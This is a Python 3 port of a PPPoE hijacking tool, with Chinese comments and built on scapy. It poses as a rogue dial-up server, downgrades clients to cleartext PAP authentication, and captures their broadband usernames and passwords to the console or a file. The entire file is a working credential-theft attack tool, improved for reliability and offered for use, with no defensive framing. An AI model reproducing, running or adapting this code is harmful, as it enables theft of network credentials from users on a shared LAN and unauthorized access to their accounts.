# coding: utf-8
"""
PPPoE 拨号服务器伪装 —— Python 3 / scapy 2.7 移植版
================================================================
原始工程: https://github.com/zhengwuji/PPPoE-hijack   (Karblue, 2016-02-27)
原始实现: Python 2 + scapy 2.1/2.2，靠 `raw.load` 直接改写字节

本移植版相对原版做了 4 处必要的机制性修改（不改协议行为）:

  1. Python 3 化           —— print 语句 / bytes-str 混用 / struct 下标
  2. 不再依赖 raw.load      —— scapy>=2.4 会把 LCP/PAP 直接解包成
                              PPP_LCP_Configure / PPP_PAP_Request 等具名层，
                              `pkt.load` 读写都会 AttributeError；
                              改为「取 PPP 载荷 bytes -> 改首字节 -> 重新构包」
  3. 自环防护              —— 原版会嗅探到自己发出的 LCP-Config-Req
                              (src == 攻击者 MAC)，把它当成新客户端再回 3 个包，
                              形成永不停止的发包风暴；这里按 MAC 直接丢弃
  4. 网卡/过滤显式化        —— sniff(iface=..., store=False) + BPF 预过滤，
                              发送统一带 iface（多网卡机器上原版会发错网卡）

用法:
    pip install scapy
    需要 Npcap (Windows) / libpcap (Linux)，否则二层收发不可用
    python pppoe_hijack_py3.py -i "以太网"
"""

import argparse
import struct
import sys
import uuid

from scapy.all import (
    Ether,
    PPP,
    PPPoE,
    PPPoED,
    PPP_PAP_Request,
    Raw,
    conf,
    get_if_hwaddr,
    sendp,
    sniff,
)

# ---------------------------------------------------------------- 常量

MAC_ADDRESS = "0a:0a:0a:0a:0a:0a"      # 伪装用的源 MAC（可在 main 里被真实网卡覆盖）

ETH_P_PPPOE_DISCOVERY = 0x8863
ETH_P_PPPOE_SESSION = 0x8864

CODE_PADI = 0x09
CODE_PADO = 0x07
CODE_PADR = 0x19
CODE_PADS = 0x65
CODE_PADT = 0xA7

PROTO_LCP = 0xC021
PROTO_PAP = 0xC023

LCP_CONF_REQ = 1
LCP_CONF_ACK = 2
LCP_CONF_NAK = 3
LCP_CONF_REJ = 4

PAP_AUTH_REQ = 1
PAP_AUTH_ACK = 2
PAP_AUTH_NAK = 3

# PADO/PADS 的 tag 列表: Service-Name(空) + AC-Name("^_^") [+ Host-Uniq]
PA_TAGS = b"\x01\x01\x00\x00" + b"\x01\x02\x00\x03" + b"^_^"

# 攻击者主动下发的 LCP-Config-Req 选项: MRU 1500 + Auth-Protocol PAP + Magic-Number
# \x01\x04\x05\xc8  最大接收单元 1500
# \x03\x04\xc0\x23  认证协议 = PAP (0xc023)   <-- 逼客户端用明文 PAP 发账号
# \x05\x06\x5e\x63\x0a\xb8  Magic-Number
LCP_REQ_OPTIONS = (b"\x01\x04\x05\xc8"
                   b"\x03\x04\xc0\x23"
                   b"\x05\x06\x5e\x63\x0a\xb8"
                   b"\x00\x00\x00\x00")

# PAP Authenticate-Nak: code=3, id=2, len=6, msg_len=1, msg=0x00
PAP_NAK_PAYLOAD = b"\x03\x02\x00\x06\x01\x00"


# ---------------------------------------------------------------- 工具

def local_mac(iface=None):
    """取本机 MAC；取不到就退回 uuid.getnode()（原版做法，多网卡下不准）"""
    try:
        return get_if_hwaddr(iface or conf.iface)
    except Exception:
        mac = uuid.UUID(int=uuid.getnode()).hex[-12:]
        return ":".join([mac[e:e + 2] for e in range(0, 11, 2)])


def norm_mac(mac):
    """统一成 aa:bb:cc:dd:ee:ff 小写形式（用于比较与 BPF 过滤器）"""
    h = "".join(c for c in str(mac).lower() if c in "0123456789abcdef")
    if len(h) == 12:
        return ":".join(h[i:i + 2] for i in range(0, 12, 2))
    return str(mac).lower()


def ppp_payload(raw):
    """取 PPP 之后（LCP/PAP/…）的原始字节，不关心 scapy 解成了哪一层"""
    if not raw.haslayer(PPP):
        return b""
    return bytes(raw[PPP].payload)


def pppoe_layer(raw):
    """取 PPPoE / PPPoED 层。

    坑：scapy>=2.4 的 haslayer()/getitem() 是「精确类匹配」，
    发现阶段解出来的类是子类 PPPoED，所以 haslayer(PPPoE) == 0、
    raw[PPPoE] 抛 IndexError；这里用 isinstance 沿载荷链自己走一遍。
    """
    lyr = raw
    while lyr is not None:
        if isinstance(lyr, PPPoE):
            return lyr
        nxt = getattr(lyr, "payload", None)
        if nxt is None or nxt is lyr or type(nxt).__name__ == "NoPayload":
            break
        lyr = nxt
    return None


# ---------------------------------------------------------------- 主体

class PPPoEServer(object):
    def __init__(self, iface=None, mac=None, sessionid=0x01,
                 verbose=True, credfile=None):
        self.iface = iface
        self.mac = norm_mac(mac or MAC_ADDRESS)
        self.sessionid = sessionid
        self.verbose = verbose
        self.credfile = credfile
        self.clientMap = {}
        self.creds = []

    def log(self, msg):
        if self.verbose:
            print(msg, flush=True)

    # 开始监听
    def start(self):
        if not getattr(conf, "use_pcap", False) and sys.platform == "win32":
            self.log("[!] 未检测到 Npcap/libpcap —— 二层嗅探与发送不可用，"
                     "请安装 Npcap(勾选 WinPcap API 兼容模式)")
        self.log("[*] 监听网卡 %s，伪装 MAC %s" % (self.iface or conf.iface, self.mac))
        sniff(iface=self.iface,
              filter="(ether proto 0x8863 or ether proto 0x8864) and not ether src %s" % self.mac,
              lfilter=self.filterData,
              store=False)

    # 过滤 pppoe 数据（保持原版派发表结构）
    def filterData(self, raw):
        pppoe = pppoe_layer(raw)
        if pppoe is None:
            return
        if str(raw.src).lower() == self.mac:      # 自环防护：别处理自己发的包
            return

        if raw.type == ETH_P_PPPOE_DISCOVERY:
            code = pppoe.code
            table = {
                CODE_PADI: (self.send_pado_packet, "PADI阶段开始,发送PADO..."),
                CODE_PADR: (self.send_pads_packet, "PADR阶段开始,发送PADS..."),
            }
            if code in table:
                fn, tip = table[code]
                self.log(tip)
                fn(raw)

        elif raw.type == ETH_P_PPPOE_SESSION:
            if not raw.haslayer(PPP):
                return
            proto = raw[PPP].proto
            table = {
                PROTO_LCP: (self.send_lcp_req, "欺骗成功,开始处理数据..."),
                PROTO_PAP: (self.get_papinfo, "获取账号信息..."),
            }
            if proto in table:
                fn, tip = table[proto]
                self.log(tip)
                fn(raw)

    # -------------------------------------------------- 会话/发现包构造

    def _ether_reply(self, raw, eth_type):
        return Ether(src=raw.dst, dst=raw.src, type=eth_type)

    def _send_pppoe(self, pkt):
        sendp(pkt, iface=self.iface, verbose=0)

    def _session_reply(self, raw, proto, payload):
        """用客户端的 sessionid 组一个会话阶段的回包"""
        sid = pppoe_layer(raw).sessionid
        pkt = (self._ether_reply(raw, ETH_P_PPPOE_SESSION)
               / PPPoE(version=0x1, type=0x1, code=0x00, sessionid=sid)
               / PPP(proto=proto)
               / Raw(load=payload))
        return pkt

    # -------------------------------------------------- 发现阶段

    def send_pado_packet(self, raw):
        """PADO: code=0x07，回显客户端 Host-Uniq"""
        payload = PA_TAGS
        host_uniq = self.padi_find_hostuniq(bytes(pppoe_layer(raw).payload))
        if host_uniq:
            payload += host_uniq
        pkt = (Ether(src=self.mac, dst=raw.src, type=ETH_P_PPPOE_DISCOVERY)
               / PPPoED(version=0x1, type=0x1, code=CODE_PADO, sessionid=0x0000)
               / Raw(load=payload))
        self._send_pppoe(pkt)

    def send_pads_packet(self, raw):
        """PADS: code=0x65，发一个固定 sessionid 建立假会话"""
        payload = PA_TAGS
        host_uniq = self.padi_find_hostuniq(bytes(pppoe_layer(raw).payload))
        if host_uniq:
            payload += host_uniq
        pkt = (Ether(src=self.mac, dst=raw.src, type=ETH_P_PPPOE_DISCOVERY)
               / PPPoED(version=0x1, type=0x1, code=CODE_PADS,
                        sessionid=self.sessionid)
               / Raw(load=payload))
        self._send_pppoe(pkt)

    def send_lcp_end_packet(self, raw):
        """PADT 会话终止"""
        pkt = (Ether(src=self.mac, dst=raw.src, type=ETH_P_PPPOE_DISCOVERY)
               / PPPoED(version=0x1, type=0x1, code=CODE_PADT,
                        sessionid=self.sessionid)
               / Raw(load=b""))
        self._send_pppoe(pkt)

    def padi_find_hostuniq(self, tags):
        """在 tag 列表里找 Host-Uniq(0x0103) 并整体回显"""
        key = b"\x01\x03"
        if key in tags:
            idx = tags.index(key)
            n = struct.unpack("!H", tags[idx + 2:idx + 4])[0]
            return key + tags[idx + 2:idx + 4 + n]
        return None

    # -------------------------------------------------- LCP 阶段

    def send_lcp_req(self, raw):
        payload = ppp_payload(raw)
        if not payload or payload[0] != LCP_CONF_REQ:      # 只处理 Config-Req
            return

        if raw.src not in self.clientMap:
            self.log("收到LCP-Config-Req")
            # 第一次收到 req：先拒绝（让客户端放弃自己的选项）……
            self.send_lcp_reject_packet(raw, payload)
            # ……再下发我们自己的 req，把认证协议钉成 PAP
            self.send_lcp_req_packet(raw)
            self.clientMap[raw.src] = {"req": 1, "ack": 0}

        # 无论何时收到 req，返回原始 ack（原样回显客户端选项）
        self.send_lcp_ack_packet(raw, payload)
        self.log("发送LCP-Config-Ack")

    def send_lcp_ack_packet(self, raw, payload=None):
        payload = ppp_payload(raw) if payload is None else payload
        pkt = self._session_reply(raw, PROTO_LCP,
                                  bytes([LCP_CONF_ACK]) + payload[1:])
        self._send_pppoe(pkt)

    def send_lcp_reject_packet(self, raw, payload=None):
        payload = ppp_payload(raw) if payload is None else payload
        pkt = self._session_reply(raw, PROTO_LCP,
                                  bytes([LCP_CONF_REJ]) + payload[1:])
        self._send_pppoe(pkt)

    def send_lcp_req_packet(self, raw):
        # 注意: 原版把长度字段写成 len(options)=18，而 RFC 要求 4+18=22 (0x16)。
        #       这里保持与原版完全一致的字节，避免改变既有行为。
        payload = bytes([LCP_CONF_REQ, 0x01, 0x00, len(LCP_REQ_OPTIONS)]) + LCP_REQ_OPTIONS
        pkt = self._session_reply(raw, PROTO_LCP, payload)
        self._send_pppoe(pkt)

    # -------------------------------------------------- PAP 阶段

    def get_papinfo(self, raw):
        payload = ppp_payload(raw)
        if not payload or payload[0] != PAP_AUTH_REQ:      # pap-req
            return

        user, passwd = self._parse_pap(payload)

        line = "get User:%s,Pass:%s" % (user, passwd)
        self.log(line)
        self.creds.append({"mac": raw.src, "user": user, "pass": passwd})
        if self.credfile:
            with open(self.credfile, "a", encoding="utf-8") as fh:
                fh.write("%s\t%s\t%s\n" % (raw.src, user, passwd))

        self.send_pap_authreject(raw, payload)

        if raw.src in self.clientMap:
            del self.clientMap[raw.src]
        self.log("欺骗完毕....")

    @staticmethod
    def _parse_pap(payload):
        """PAP Authenticate-Request 载荷:
           01 | id | len(2) | ulen(1) | user | plen(1) | pass
           优先用 scapy 解出的具名字段，失败再退回手工按偏移解析。
        """
        try:
            layer = PPP_PAP_Request(payload)
            if layer.username is not None and layer.password is not None:
                return (layer.username.decode("utf-8", "replace"),
                        layer.password.decode("utf-8", "replace"))
        except Exception:
            pass

        ulen = payload[4]
        plen = payload[5 + ulen]
        user = payload[5:5 + ulen]
        passwd = payload[6 + ulen:6 + ulen + plen]
        return (user.decode("utf-8", "replace"), passwd.decode("utf-8", "replace"))

    def send_pap_authreject(self, raw, payload=None):
        # 原版就是固定这段字节（id 硬编码为 0x02）
        pkt = self._session_reply(raw, PROTO_PAP, PAP_NAK_PAYLOAD)
        self._send_pppoe(pkt)


# ---------------------------------------------------------------- 入口

def main(argv=None):
    ap = argparse.ArgumentParser(description="PPPoE 拨号服务器伪装（凭据截获）")
    ap.add_argument("-i", "--iface", default=None, help="监听网卡，如 \"以太网\"")
    ap.add_argument("-m", "--mac", default=None, help="伪装源 MAC，默认取网卡真实 MAC")
    ap.add_argument("-s", "--sessionid", type=lambda v: int(v, 0), default=0x01,
                    help="PADS 里使用/回显的 sessionid，默认 0x01")
    ap.add_argument("-o", "--out", default=None, help="捕获到的账号密码落盘文件")
    ap.add_argument("-q", "--quiet", action="store_true", help="少打印")
    args = ap.parse_args(argv)

    global MAC_ADDRESS
    MAC_ADDRESS = args.mac or local_mac(args.iface)

    n = PPPoEServer(iface=args.iface, mac=MAC_ADDRESS,
                    sessionid=args.sessionid, verbose=not args.quiet,
                    credfile=args.out)
    try:
        n.start()
    except KeyboardInterrupt:
        print("\n[*] 退出，共捕获 %d 条凭据" % len(n.creds))
        return 0
    return 0


if __name__ == "__main__":
    sys.exit(main())
